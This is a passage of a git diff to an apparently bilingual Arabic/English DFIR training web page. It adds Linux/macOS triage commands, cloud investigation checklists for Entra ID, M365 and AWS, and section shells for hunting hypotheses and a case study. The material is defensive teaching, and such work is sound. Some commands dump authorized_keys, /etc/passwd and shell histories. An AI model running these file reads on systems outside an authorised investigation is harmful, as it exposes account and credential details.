@@ -522,6 +522,43 @@ body.AR .tz-rule{border-left:none;border-right:3px solid var(--c3)}
   .triage-area{grid-template-columns:1fr}
   .contain-risk{grid-template-columns:1fr}
 }
+
+/* ══ V10 NEW SECTIONS ══ */
+.os-tabs{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:1.2rem}
+.os-tab{padding:6px 14px;border:1px solid var(--border);border-radius:7px;background:var(--bg3);color:var(--text2);font-size:12px;font-family:'JetBrains Mono','Consolas',monospace;cursor:pointer;transition:all .15s}
+.os-tab.on{background:var(--text);color:var(--bg);border-color:var(--text)}
+.os-panel{display:none}.os-panel.on{display:block}
+
+.hunt-card{background:var(--bg2);border:1px solid var(--border);border-radius:13px;overflow:hidden;box-shadow:var(--sh);margin-bottom:1rem;transition:background .3s,border-color .3s}
+.hunt-hd{padding:.9rem 1.3rem;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px}
+.hunt-badge{font-family:'JetBrains Mono','Consolas',monospace;font-size:10px;padding:2px 8px;border-radius:4px;font-weight:600}
+.hunt-title{font-size:13px;font-weight:700;color:var(--text)}
+.hunt-body{padding:1rem 1.3rem}
+.hunt-hypo{font-size:13px;color:var(--text2);line-height:1.75;margin-bottom:.9rem;padding:.8rem 1rem;background:var(--bg3);border-radius:8px;border-left:3px solid var(--c2)}
+body.AR .hunt-hypo{border-left:none;border-right:3px solid var(--c2)}
+.hunt-items{display:flex;flex-direction:column;gap:5px}
+.hunt-item{display:flex;gap:8px;font-size:12px;color:var(--text2);line-height:1.6;align-items:flex-start}
+.hunt-item::before{content:"\25B8";color:var(--c2);font-size:11px;flex-shrink:0;margin-top:2px;font-family:'JetBrains Mono',monospace}
+
+.case-timeline-table{width:100%;border-collapse:collapse;font-size:13px;margin-top:.75rem}
+.case-timeline-table th{padding:8px 12px;background:var(--bg3);border-bottom:2px solid var(--border);font-size:11px;font-family:'JetBrains Mono','Consolas',monospace;color:var(--text3);text-align:left;white-space:nowrap}
+body.AR .case-timeline-table th{text-align:right}
+.case-timeline-table td{padding:8px 12px;border-bottom:1px solid var(--border);vertical-align:top;line-height:1.6}
+.case-timeline-table tr:last-child td{border-bottom:none}
+.case-timeline-table tr:hover td{background:var(--bg3)}
+.evt-time{font-family:'JetBrains Mono','Consolas',monospace;font-size:11px;color:var(--c2);white-space:nowrap}
+.evt-src{font-size:10px;font-family:'JetBrains Mono','Consolas',monospace;padding:2px 6px;background:var(--bg3);border:1px solid var(--border);border-radius:4px;white-space:nowrap}
+
+.kape-box{background:var(--bg2);border:1px solid var(--border);border-radius:13px;padding:1.3rem;box-shadow:var(--sh);margin-bottom:1rem}
+.cloud-steps{display:flex;flex-direction:column;gap:7px;margin-top:.75rem}
+.cloud-step{display:flex;gap:9px;padding:8px 11px;background:var(--bg3);border-radius:8px;border:1px solid var(--border);font-size:13px;color:var(--text2);line-height:1.6;align-items:flex-start}
+.cloud-step-n{font-family:'JetBrains Mono','Consolas',monospace;font-size:10px;color:var(--text4);flex-shrink:0;margin-top:2px;min-width:18px}
+
+.vol-output{background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:10px 13px;font-family:'JetBrains Mono','Consolas',monospace;font-size:11px;color:var(--text2);line-height:1.85;margin-bottom:.75rem;white-space:pre}
+.vol-highlight{color:var(--c4);font-weight:700}
+.vol-note{color:var(--c1);font-style:italic}
+
+@media(max-width:860px){.case-timeline-table{min-width:600px}.hunt-body{padding:.75rem 1rem}}
 </style>
 </head>
 <body>
@@ -560,6 +597,10 @@ body.AR .tz-rule{border-left:none;border-right:3px solid var(--c3)}
       <div class="s-group-label"><span class="ari">&#x0645;&#x062A;&#x0642;&#x062F;&#x0645; &#x0648;&#x062A;&#x0642;&#x0627;&#x0631;&#x064A;&#x0631;</span><span class="eni">Advanced &amp; Reporting</span></div>
       <a href="#advanced" class="na" onclick="setOn(this)"><span class="nnum">15</span><span class="ndot" style="background:var(--c5)"></span><span class="ari">&#x0645;&#x0641;&#x0627;&#x0647;&#x064A;&#x0645; &#x0645;&#x062A;&#x0642;&#x062F;&#x0645;&#x0629;</span><span class="eni">Advanced Concepts</span></a>
       <a href="#dfir-concepts" class="na" onclick="setOn(this)"><span class="nnum">17</span><span class="ndot" style="background:var(--c4)"></span><span class="ari">&#x0645;&#x0646;&#x0647;&#x062C;&#x064A;&#x0629; &#x0627;&#x0644;&#x062A;&#x062D;&#x0642;&#x064A;&#x0642;</span><span class="eni">Investigation Mindset</span></a>
+      <a href="#linux-mac" class="na" onclick="setOn(this)"><span class="nnum">18</span><span class="ndot" style="background:var(--c3)"></span><span class="ari">Linux / macOS DFIR</span><span class="eni">Linux / macOS DFIR</span></a>
+      <a href="#cloud-dfir" class="na" onclick="setOn(this)"><span class="nnum">19</span><span class="ndot" style="background:var(--c2)"></span><span class="ari">Cloud DFIR</span><span class="eni">Cloud DFIR</span></a>
+      <a href="#threat-hunting-lab" class="na" onclick="setOn(this)"><span class="nnum">20</span><span class="ndot" style="background:var(--c5)"></span><span class="ari">&#x0641;&#x0631;&#x0636;&#x064A;&#x0627;&#x062A; &#x0627;&#x0644;&#x0635;&#x064A;&#x062F;</span><span class="eni">Hunting Hypotheses</span></a>
+      <a href="#case-study" class="na" onclick="setOn(this)"><span class="nnum">21</span><span class="ndot" style="background:var(--c6)"></span><span class="ari">&#x062F;&#x0631;&#x0627;&#x0633;&#x0629; &#x062D;&#x0627;&#x0644;&#x0629;</span><span class="eni">Case Study</span></a>
       <a href="#reporting" class="na" onclick="setOn(this)"><span class="nnum">16</span><span class="ndot" style="background:var(--c6)"></span><span class="ari">&#x0627;&#x0644;&#x062A;&#x0642;&#x0627;&#x0631;&#x064A;&#x0631;</span><span class="eni">Reporting</span></a>
       <a href="#references" class="na" onclick="setOn(this)"><span class="nnum">&#x1F4DA;</span><span class="ndot" style="background:var(--c3)"></span><span class="ari">&#x0645;&#x0631;&#x0627;&#x062C;&#x0639;</span><span class="eni">References</span></a>
     </div>
@@ -594,7 +635,7 @@ body.AR .tz-rule{border-left:none;border-right:3px solid var(--c3)}
     <a href="https://www.linkedin.com/in/nawaf-alh" target="_blank" rel="noopener noreferrer" aria-label="Nawaf Alharthi on LinkedIn"><svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" style="vertical-align:middle;margin-left:3px;flex-shrink:0"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065 2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg> Nawaf Alharthi</a>
   </div>
 <div class="hst">
-    <div class="hs"><div class="hsn">17</div><div class="hsl"><span class="ari">&#x0642;&#x0633;&#x0645;</span><span class="eni">Sections</span></div></div>
+    <div class="hs"><div class="hsn">21</div><div class="hsl"><span class="ari">&#x0642;&#x0633;&#x0645;</span><span class="eni">Sections</span></div></div>
     <div class="hs"><div class="hsn">6</div><div class="hsl"><span class="ari">&#x0645;&#x0631;&#x0627;&#x062D;&#x0644; IR</span><span class="eni">IR Phases</span></div></div>
     <div class="hs"><div class="hsn">8</div><div class="hsl"><span class="ari">&#x0645;&#x0631;&#x0627;&#x062D;&#x0644; &#x0647;&#x062C;&#x0648;&#x0645;</span><span class="eni">Attack Stages</span></div></div>
     <div class="hs"><div class="hsn">40+</div><div class="hsl"><span class="ari">&#x0623;&#x062F;&#x0627;&#x0629; &#x0648;&#x0645;&#x0641;&#x0647;&#x0648;&#x0645;</span><span class="eni">Tools &amp; Concepts</span></div></div>
@@ -972,6 +1013,75 @@ body.AR .tz-rule{border-left:none;border-right:3px solid var(--c3)}
     </p>
   </div>
   <div class="adv-grid fade" id="refs-grid"></div>
+</section>
+
+<!-- ══ 18: LINUX / macOS DFIR ══ -->
+<section class="sec alt" id="linux-mac">
+  <div class="shd fade">
+    <div class="sey">// 18 — linux &amp; macos dfir basics</div>
+    <h2 class="st">
+      <span class="ar">DFIR &#x0639;&#x0644;&#x0649; Linux &#x0648; macOS</span>
+      <span class="en">Linux &amp; macOS DFIR Basics</span>
+    </h2>
+    <p class="sd">
+      <span class="ar">&#x0643;&#x062B;&#x064A;&#x0631; &#x0645;&#x0646; &#x0627;&#x0644;&#x062D;&#x0648;&#x0627;&#x062F;&#x062B; &#x062A;&#x0634;&#x0645;&#x0644; Linux servers &#x0623;&#x0648; Mac endpoints. &#x062A;&#x0639;&#x0644;&#x0651;&#x0645; &#x0623;&#x064A;&#x0646; &#x062A;&#x0628;&#x062D;&#x062B; &#x0648;&#x0645;&#x0627;&#x0630;&#x0627; &#x062A;&#x0628;&#x062D;&#x062B; &#x0639;&#x0646;&#x0647;.</span>
+      <span class="en">Many incidents involve Linux servers or Mac endpoints. Know where to look and what artifacts matter on each OS.</span>
+    </p>
+  </div>
+  <div class="os-tabs fade">
+    <button class="os-tab on" onclick="switchOS(this,'os-linux')">&#x1F427; Linux</button>
+    <button class="os-tab" onclick="switchOS(this,'os-mac')">&#xF8FF; macOS</button>
+  </div>
+  <div id="os-linux" class="os-panel on fade" id="os-linux-panel"></div>
+  <div id="os-mac" class="os-panel fade" id="os-mac-panel"></div>
+</section>
+
+<!-- ══ 19: CLOUD DFIR ══ -->
+<section class="sec" id="cloud-dfir">
+  <div class="shd fade">
+    <div class="sey">// 19 — cloud dfir investigation</div>
+    <h2 class="st">
+      <span class="ar">Cloud DFIR &#x2014; &#x062A;&#x062D;&#x0642;&#x064A;&#x0642; &#x0641;&#x064A; &#x0627;&#x0644;&#x0633;&#x062D;&#x0627;&#x0628;&#x0629;</span>
+      <span class="en">Cloud DFIR — Entra ID, M365 &amp; AWS</span>
+    </h2>
+    <p class="sd">
+      <span class="ar">&#x0646;&#x0635;&#x0641; &#x0627;&#x0644;&#x062A;&#x062D;&#x0642;&#x064A;&#x0642;&#x0627;&#x062A; &#x0627;&#x0644;&#x062D;&#x062F;&#x064A;&#x062B;&#x0629; &#x062A;&#x0628;&#x062F;&#x0623; &#x0645;&#x0646; &#x0647;&#x0648;&#x064A;&#x0629; &#x0633;&#x062D;&#x0627;&#x0628;&#x064A;&#x0629;. &#x0641;&#x0647;&#x0645; &#x0643;&#x064A;&#x0641; &#x062A;&#x062D;&#x0642;&#x0651;&#x0642; &#x0641;&#x064A; Entra ID &#x0648; M365 &#x0648; AWS.</span>
+      <span class="en">Half of modern investigations start from a cloud identity. Know how to investigate Entra ID, M365, and AWS CloudTrail.</span>
+    </p>
+  </div>
+  <div class="triage-area fade" id="cloud-dfir-grid"></div>
+</section>
+
+<!-- ══ 20: THREAT HUNTING HYPOTHESES ══ -->
+<section class="sec alt" id="threat-hunting-lab">
+  <div class="shd fade">
+    <div class="sey">// 20 — threat hunting hypotheses</div>
+    <h2 class="st">
+      <span class="ar">&#x0641;&#x0631;&#x0636;&#x064A;&#x0627;&#x062A; &#x0627;&#x0644;&#x0628;&#x062D;&#x062B; &#x0639;&#x0646; &#x0627;&#x0644;&#x062A;&#x0647;&#x062F;&#x064A;&#x062F;&#x0627;&#x062A;</span>
+      <span class="en">Threat Hunting Hypotheses</span>
+    </h2>
+    <p class="sd">
+      <span class="ar">&#x0627;&#x0644;&#x0635;&#x064A;&#x062F; &#x064A;&#x0628;&#x062F;&#x0623; &#x0628;&#x0641;&#x0631;&#x0636;&#x064A;&#x0629; &#x2014; &#x0645;&#x0627;&#x0630;&#x0627; &#x062A;&#x0641;&#x062A;&#x0631;&#x0636; &#x0623;&#x0646; &#x0627;&#x0644;&#x0645;&#x0647;&#x0627;&#x062C;&#x0645; &#x064A;&#x0641;&#x0639;&#x0644;&#x0647;&#x061F; &#x062B;&#x0645; &#x0627;&#x0628;&#x062D;&#x062B; &#x0639;&#x0646; &#x062F;&#x0644;&#x064A;&#x0644;&#x0647;.</span>
+      <span class="en">Hunting starts with a hypothesis — what do you assume the attacker did? Then search for evidence of it.</span>
+    </p>
+  </div>
+  <div id="hunting-cards"></div>
+</section>
+
+<!-- ══ 21: PRACTICAL CASE STUDY ══ -->
+<section class="sec" id="case-study">
+  <div class="shd fade">
+    <div class="sey">// 21 — practical dfir case study</div>
+    <h2 class="st">
+      <span class="ar">&#x062F;&#x0631;&#x0627;&#x0633;&#x0629; &#x062D;&#x0627;&#x0644;&#x0629; &#x0639;&#x0645;&#x0644;&#x064A;&#x0629; &#x2014; &#x062A;&#x0635;&#x064A;&#x062F; &#x064A;&#x0624;&#x062F;&#x064A; &#x0644;&#x062A;&#x0646;&#x0641;&#x064A;&#x0630; PowerShell</span>
+      <span class="en">Practical Case Study — Phishing to PowerShell Execution</span>
+    </h2>
+    <p class="sd">
+      <span class="ar">&#x0633;&#x064A;&#x0646;&#x0627;&#x0631;&#x064A;&#x0648; &#x062A;&#x0639;&#x0644;&#x064A;&#x0645;&#x064A; &#x0648;&#x0647;&#x0645;&#x064A; &#x2014; &#x064A;&#x0648;&#x0636;&#x062D; &#x0643;&#x064A;&#x0641; &#x062A;&#x0633;&#x064A;&#x0631; &#x0639;&#x0645;&#x0644;&#x064A;&#x0629; &#x0627;&#x0644;&#x062A;&#x062D;&#x0642;&#x064A;&#x0642; &#x0645;&#x0646; &#x0627;&#x0644;&#x062A;&#x0646;&#x0628;&#x064A;&#x0647; &#x062D;&#x062A;&#x0649; &#x0627;&#x0644;&#x0627;&#x0633;&#x062A;&#x0646;&#x062A;&#x0627;&#x062C;. &#x0644;&#x0627; &#x062A;&#x062D;&#x062A;&#x0648;&#x064A; &#x0639;&#x0644;&#x0649; &#x0628;&#x064A;&#x0627;&#x0646;&#x0627;&#x062A; &#x062D;&#x0642;&#x064A;&#x0642;&#x064A;&#x0629;.</span>
+      <span class="en">A fictional educational scenario showing how a real investigation flows from alert to conclusion. No real data included.</span>
+    </p>
+  </div>
+  <div class="fade" id="case-study-body"></div>
 </section>
 </main></div>
 <script>
@@ -2573,6 +2683,375 @@ function updateMobileBar(){
 }
 setTimeout(updateMobileBar,300);
 
+
+// ══════════════════════════════
+// V10 NEW SECTION BUILDERS
+// ══════════════════════════════
+
+// ── OS Tab switch ──
+function switchOS(btn, panelId){
+  document.querySelectorAll('.os-tab').forEach(function(b){b.classList.remove('on');});
+  document.querySelectorAll('.os-panel').forEach(function(p){p.classList.remove('on');});
+  btn.classList.add('on');
+  var panel=document.getElementById(panelId);
+  if(panel)panel.classList.add('on');
+}
+
+// ── Linux DFIR ──
+var LINUX_AREAS=[
+  {ic:'\u2699\uFE0F',titleAr:'\u0627\u0644\u0639\u0645\u0644\u064a\u0627\u062a \u0648\u0627\u0644\u0634\u0628\u0643\u0629',titleEn:'Processes & Network',
+   descAr:'\u0623\u0648\u0644 \u0634\u064a\u0621 \u062a\u0641\u062d\u0635\u0647 \u2014 \u0645\u0646 \u064a\u0634\u062a\u063a\u0644 \u0648\u0645\u0646 \u064a\u062a\u0635\u0644 \u0628\u0645\u0646',
+   descEn:'First things to check \u2014 who is running and who is connecting',
+   cmd:'# Running processes\nps aux\nps auxf  # tree view\n\n# Network connections with PIDs\nss -tunap\nlsof -i\n\n# Who is logged in\nw\nlast\nlastlog'},
+  {ic:'\uD83D\uDCC4',titleAr:'\u0644\u0648\u0642\u0632 \u0627\u0644\u0645\u0635\u0627\u062f\u0642\u0629',titleEn:'Authentication Logs',
+   descAr:'\u0633\u062c\u0644\u0627\u062a \u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644 \u0648\u0645\u062d\u0627\u0648\u0644\u0627\u062a Sudo \u2014 \u062a\u0643\u0634\u0641 \u0627\u0644\u062f\u062e\u0648\u0644 \u063a\u064a\u0631 \u0627\u0644\u0645\u0635\u0631\u062d \u0628\u0647',
+   descEn:'Login and sudo logs \u2014 reveal unauthorized access and privilege escalation',
+   cmd:'# Auth log (Debian/Ubuntu)\ncat /var/log/auth.log | grep -i "failed\\|sudo\\|session"\n\n# systemd-based (RHEL/CentOS/Fedora)\njournalctl _COMM=sshd --since "24 hours ago"\njournalctl -xe | grep -i "sudo\\|failed"\n\n# Failed SSH attempts\ngrep "Failed password" /var/log/auth.log | awk \'{print $11}\' | sort | uniq -c | sort -rn'},
+  {ic:'\uD83D\uDDC2\uFE0F',titleAr:'\u0627\u0644\u0627\u0633\u062a\u0645\u0631\u0627\u0631\u064a\u0629 \u0648\u0627\u0644\u062e\u062f\u0645\u0627\u062a',titleEn:'Persistence & Services',
+   descAr:'Cron jobs \u0648Systemd services \u0648SSH keys \u2014 \u0623\u0643\u062b\u0631 \u0623\u0645\u0627\u0643\u0646 \u0627\u062e\u062a\u0628\u0627\u0621 \u0627\u0644\u0645\u0647\u0627\u062c\u0645\u064a\u0646',
+   descEn:'Cron, systemd, and SSH keys \u2014 most common Linux persistence locations',
+   cmd:'# Cron jobs (all users)\ncrontab -l\ncat /etc/crontab\nls -la /etc/cron.*\n\n# Systemd services\nsystemctl list-units --type=service --state=running\nfind /etc/systemd /usr/lib/systemd -name "*.service" -newer /tmp\n\n# SSH authorized_keys\ncat ~/.ssh/authorized_keys\nfind /home -name "authorized_keys" -exec cat {} \\;\nfind /root -name "authorized_keys" 2>/dev/null'},
+  {ic:'\uD83D\uDCC1',titleAr:'\u0645\u0644\u0641\u0627\u062a \u0645\u0634\u0628\u0648\u0647\u0629',titleEn:'Suspicious Files & History',
+   descAr:'/tmp \u0648/dev/shm \u0648Bash history \u2014 \u0627\u0644\u0645\u0647\u0627\u062c\u0645 \u064a\u0636\u0639\u0648\u0646 \u0645\u0644\u0641\u0627\u062a\u0647\u0645 \u0647\u0646\u0627',
+   descEn:'/tmp, /dev/shm, and bash history \u2014 attackers stage files here',
+   cmd:'# Suspicious staging locations\nls -lah /tmp /var/tmp /dev/shm\nfind /tmp /var/tmp /dev/shm -type f -mtime -7\n\n# Bash history\ncat ~/.bash_history\ncat /root/.bash_history\nfind /home -name ".bash_history" -exec cat {} \\;\n\n# New users\ncat /etc/passwd | awk -F: \'$3 >= 1000\'\n\n# Hash suspicious file\nsha256sum /tmp/suspicious_file'},
+];
+
+var MAC_AREAS=[
+  {ic:'\uD83D\uDD0D',titleAr:'\u0627\u0644\u0639\u0645\u0644\u064a\u0627\u062a \u0648\u0627\u0644\u0634\u0628\u0643\u0629',titleEn:'Processes & Network',
+   descAr:'\u0646\u0641\u0633 \u0645\u0628\u062f\u0623 Linux \u2014 \u0641\u062d\u0635 \u0645\u0646 \u064a\u0634\u062a\u063a\u0644 \u0648\u0645\u0646 \u064a\u062a\u0635\u0644',
+   descEn:'Same principle as Linux \u2014 check who is running and connecting',
+   cmd:'# Processes\nps aux\n\n# Network connections\nlsof -i\nnetstat -an | grep ESTABLISHED\n\n# Who logged in\nlast\nw'},
+  {ic:'\uD83D\uDD17',titleAr:'\u0627\u0644\u0627\u0633\u062a\u0645\u0631\u0627\u0631\u064a\u0629 \u2014 LaunchAgents',titleEn:'Persistence \u2014 LaunchAgents',
+   descAr:'\u0623\u0643\u062b\u0631 \u0623\u0645\u0627\u0643\u0646 \u0627\u0644\u0627\u0633\u062a\u0645\u0631\u0627\u0631\u064a\u0629 \u0641\u064a macOS \u2014 \u0634\u0628\u064a\u0647\u0629 \u0628\u0640 Scheduled Tasks',
+   descEn:'Most common macOS persistence \u2014 similar to Windows Scheduled Tasks',
+   cmd:'# User LaunchAgents (per-user persistence)\nls -la ~/Library/LaunchAgents\ncat ~/Library/LaunchAgents/*.plist\n\n# System-wide daemons\nls -la /Library/LaunchDaemons\nls -la /Library/LaunchAgents\n\n# Login items\nosascript -e \'tell app "System Events" to get name of every login item\''},
+  {ic:'\uD83D\uDCCB',titleAr:'\u0627\u0644\u0644\u0648\u0642\u0632 \u0648\u0627\u0644\u062d\u062c\u0631 \u0627\u0644\u0635\u062d\u064a',titleEn:'Unified Logs & Quarantine',
+   descAr:'macOS Unified Log \u064a\u062a\u062a\u0628\u0639 \u0643\u0644 \u0634\u064a\u0621 \u2014 \u0623\u0642\u0648\u0649 \u0645\u0635\u062f\u0631 \u0644\u0644\u062a\u062d\u0644\u064a\u0644',
+   descEn:'macOS Unified Log tracks everything \u2014 the most powerful investigation source',
+   cmd:'# Quarantine events (downloaded files)\nlog show --predicate \'eventMessage contains "quarantine"\' --last 24h\n\n# Application launches\nlog show --predicate \'process == "lsquarantine"\' --last 48h\n\n# SSH events\nlog show --predicate \'process == "sshd"\' --last 24h\n\n# Recent downloads\nfind ~/Downloads -type f -mtime -7\nls -lah ~/Downloads'},
+  {ic:'\uD83E\uDDA0',titleAr:'\u0627\u0644\u0645\u0644\u0641\u0627\u062a \u0648Gatekeeper',titleEn:'Suspicious Files & Gatekeeper',
+   descAr:'Gatekeeper \u064a\u0648\u062b\u0651\u0642 \u0627\u0644\u062a\u0637\u0628\u064a\u0642\u0627\u062a \u2014 \u062a\u062d\u0642\u0651\u0642 \u0645\u0646 \u0627\u0644\u0645\u0644\u0641\u0627\u062a \u063a\u064a\u0631 \u0627\u0644\u0645\u0648\u0642\u0651\u0639\u0629',
+   descEn:'Gatekeeper logs app execution \u2014 check for unsigned or untrusted binaries',
+   cmd:'# Check Gatekeeper / quarantine DB\nsqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2 \\\n  "select LSQuarantineDataURLString from LSQuarantineEvent order by LSQuarantineTimeStamp desc limit 20"\n\n# Unsigned apps\nspctl -a /Applications/SuspiciousApp.app\n\n# Hash a file\nshasum -a 256 /tmp/suspicious_file\n\n# Browser downloads\nfind ~/Library/Application\\ Support -name "*.sqlite" | xargs strings | grep "http"'},
+];
+
+function buildOSSection(containerId, areas){
+  var C=document.getElementById(containerId);
+  if(!C)return;
+  var grid=document.createElement('div');
+  grid.style.cssText='display:grid;grid-template-columns:1fr 1fr;gap:13px';
+  areas.forEach(function(a){
+    var card=document.createElement('div');card.className='tbox';
+    card.innerHTML='<div class="tbox-hd" style="background:var(--c2l)">'
+      +'<div class="tbox-ic" style="background:var(--bg2)">'+a.ic+'</div>'
+      +'<div><div class="tbox-title"><span class="ar">'+a.titleAr+'</span><span class="en">'+a.titleEn+'</span></div>'
+      +'<div class="tbox-sub"><span class="ar">'+a.descAr+'</span><span class="en">'+a.descEn+'</span></div></div></div>'
+      +'<div class="tbox-body"><div class="code-block" style="margin-top:0">'+a.cmd.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')+'</div></div>';
+    grid.appendChild(card);
+  });
+  C.appendChild(grid);
+  // add kape note to linux
+  if(containerId==='os-linux'){
+    var kapeNote=document.createElement('div');
+    kapeNote.className='kape-box';
+    kapeNote.style.marginTop='1rem';
+    kapeNote.innerHTML='<div style="display:flex;gap:10px;align-items:flex-start">'
+      +'<span style="font-size:22px">&#x1F9F2;</span>'
+      +'<div><div style="font-size:14px;font-weight:700;color:var(--c1);margin-bottom:4px">KAPE <span style="font-size:11px;font-weight:400;color:var(--text3)">(Kroll Artifact Parser and Extractor)</span></div>'
+      +'<div style="font-size:13px;color:var(--text2);line-height:1.75;margin-bottom:.75rem">'
+      +'<span class="ar">KAPE \u0623\u062f\u0627\u0629 \u0645\u0647\u0645\u0629 \u062c\u062f\u0627\u064b \u0641\u064a DFIR \u0644\u062c\u0645\u0639 \u0627\u0644\u0623\u062f\u0644\u0629 \u0628\u0633\u0631\u0639\u0629 \u0645\u0646 \u0623\u062c\u0647\u0632\u0629 Windows. \u062a\u062c\u0645\u0639 Event Logs \u0648Registry Hives \u0648Browser Artifacts \u0648Prefetch \u0648Amcache \u0648Shimcache \u0648LNK Files \u0648Jump Lists \u0628\u062f\u0648\u0646 \u0627\u0644\u062d\u0627\u062c\u0629 \u0644\u0646\u0633\u062e\u0629 \u0643\u0627\u0645\u0644\u0629 \u0644\u0644\u0642\u0631\u0635.</span>'
+      +'<span class="en">KAPE is widely used in DFIR to quickly collect forensic artifacts from Windows. Collects Event Logs, Registry Hives, Browser Artifacts, Prefetch, Amcache, Shimcache, LNK Files, and Jump Lists without needing a full disk image.</span>'
+      +'</div>'
+      +'<div style="display:flex;flex-wrap:wrap;gap:5px">'
+      +['Windows triage','Fast artifact collection','Timeline building','IR collection','No full disk imaging needed']
+        .map(function(t){return'<span class="spill">'+t+'</span>';}).join('')
+      +'</div></div></div>';
+    C.appendChild(kapeNote);
+  }
+}
+
+function bLinuxMac(){
+  buildOSSection('os-linux', LINUX_AREAS);
+  buildOSSection('os-mac', MAC_AREAS);
+  // fix grid responsive
+  var grids=document.querySelectorAll('#os-linux > div, #os-mac > div');
+  function fixGrids(){
+    grids.forEach(function(g){if(g.style&&g.style.gridTemplateColumns!==undefined){g.style.gridTemplateColumns=window.innerWidth<700?'1fr':'1fr 1fr';}});
+  }
+  window.addEventListener('resize',fixGrids);setTimeout(fixGrids,500);
+}
+
+// ── Cloud DFIR ──
+var CLOUD_PANELS=[
+  {ic:'\uD83C\uDF10',titleAr:'Entra ID / M365',titleEn:'Entra ID / Microsoft 365',c:'c2',
+   stepsAr:[
+     '\u0631\u0627\u062c\u0639 Sign-in Logs \u2014 \u0645\u0646 \u0623\u064a\u0646\u060c \u0623\u064a IP\u060c \u0623\u064a \u062f\u0648\u0644\u0629',
+     '\u0627\u0628\u062d\u062b \u0639\u0646 Impossible Travel \u2014 \u062f\u062e\u0648\u0644 \u0645\u0646 \u0628\u0644\u062f\u064a\u0646 \u0645\u062e\u062a\u0644\u0641\u064a\u0646 \u0628\u0641\u0627\u0635\u0644 \u0632\u0645\u0646\u064a \u0645\u0633\u062a\u062d\u064a\u0644',
+     '\u0641\u062d\u0635 \u0641\u0634\u0644 MFA \u0648 MFA Fatigue \u2014 \u0637\u0644\u0628\u0627\u062a \u0643\u062b\u064a\u0631\u0629 \u0644\u0644\u0645\u0648\u0627\u0641\u0642\u0629',
+     '\u0631\u0627\u062c\u0639 Risky Users \u0641\u064a Entra ID Protection',
+     '\u0627\u0641\u062d\u0635 \u062a\u063a\u064a\u064a\u0631\u0627\u062a \u0635\u0644\u0627\u062d\u064a\u0627\u062a Admin \u0627\u0644\u062c\u062f\u064a\u062f\u0629',
+     '\u0627\u0628\u062d\u062b \u0639\u0646 Mailbox Rules \u0627\u0644\u0645\u0634\u0628\u0648\u0647\u0629 \u2014 \u0625\u062e\u0641\u0627\u0621 \u0623\u0648 \u0625\u0639\u0627\u062f\u0629 \u062a\u0648\u062c\u064a\u0647',
+     '\u0641\u062d\u0635 OAuth App Consent \u2014 \u0647\u0644 \u062a\u0645 \u0645\u0646\u062d \u0635\u0644\u0627\u062d\u064a\u0627\u062a \u0644\u062a\u0637\u0628\u064a\u0642 \u063a\u064a\u0631 \u0645\u0639\u0631\u0648\u0641',
+     '\u0641\u062d\u0635 \u062a\u062d\u0645\u064a\u0644\u0627\u062a SharePoint / OneDrive \u0627\u0644\u0636\u062e\u0645\u0629',
+     '\u0627\u0641\u062d\u0635 Inbox Forwarding Rules \u2014 \u062a\u062d\u0648\u064a\u0644 \u0627\u0644\u0628\u0631\u064a\u062f \u0644\u062e\u0627\u0631\u062c',
+     '\u0631\u0627\u062c\u0639 Unified Audit Log \u2014 \u0645\u0635\u062f\u0631 \u0644\u0627 \u063a\u0646\u0649 \u0639\u0646\u0647',
+   ],
+   stepsEn:[
+     'Review sign-in logs \u2014 from where, which IP, which country',
+     'Check impossible travel \u2014 logins from two countries within impossible time',
+     'Check MFA failures and MFA fatigue \u2014 excessive approval requests',
+     'Review risky users in Entra ID Protection',
+     'Check new admin role assignments',
+     'Look for suspicious mailbox rules \u2014 hidden or forwarding',
+     'Review OAuth app consent \u2014 was permission granted to unknown app',
+     'Check large SharePoint / OneDrive downloads',
+     'Check inbox forwarding rules \u2014 external forwarding',
+     'Review Unified Audit Log \u2014 essential source',
+   ],
+   questions:[
+     {ar:'\u0645\u0646 \u0633\u062c\u0651\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\u061f',en:'Who signed in?'},
+     {ar:'\u0645\u0646 \u0623\u064a \u062f\u0648\u0644\u0629 \u0623\u0648 IP\u061f',en:'From which country or IP?'},
+     {ar:'\u0647\u0644 \u062a\u0645 \u062a\u062c\u0627\u0648\u0632 MFA\u061f',en:'Was MFA bypassed?'},
+     {ar:'\u0647\u0644 \u062a\u0645 \u0625\u0646\u0634\u0627\u0621 Mailbox Rule\u061f',en:'Was a mailbox rule created?'},
+     {ar:'\u0647\u0644 \u062a\u0645 \u062a\u062d\u0645\u064a\u0644 \u0645\u0644\u0641\u0627\u062a \u0643\u062b\u064a\u0631\u0629\u061f',en:'Were many files downloaded?'},
+     {ar:'\u0647\u0644 \u0645\u0646\u062d OAuth \u0635\u0644\u0627\u062d\u064a\u0627\u062a \u0644\u062a\u0637\u0628\u064a\u0642 \u062e\u0627\u0631\u062c\u064a\u061f',en:'Was OAuth consent granted to an external app?'},
+   ]
+  },
+  {ic:'\uD83D\uDCBB',titleAr:'AWS CloudTrail',titleEn:'AWS CloudTrail Investigation',c:'c3',
+   stepsAr:[
+     'ConsoleLogin \u2014 \u0645\u0646 \u062f\u062e\u0644 \u0648\u0645\u0646 \u0623\u064a\u0646',
+     '\u0641\u062d\u0635 \u0641\u0634\u0644 \u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644 \u2014 \u0645\u062d\u0627\u0648\u0644\u0627\u062a Brute Force',
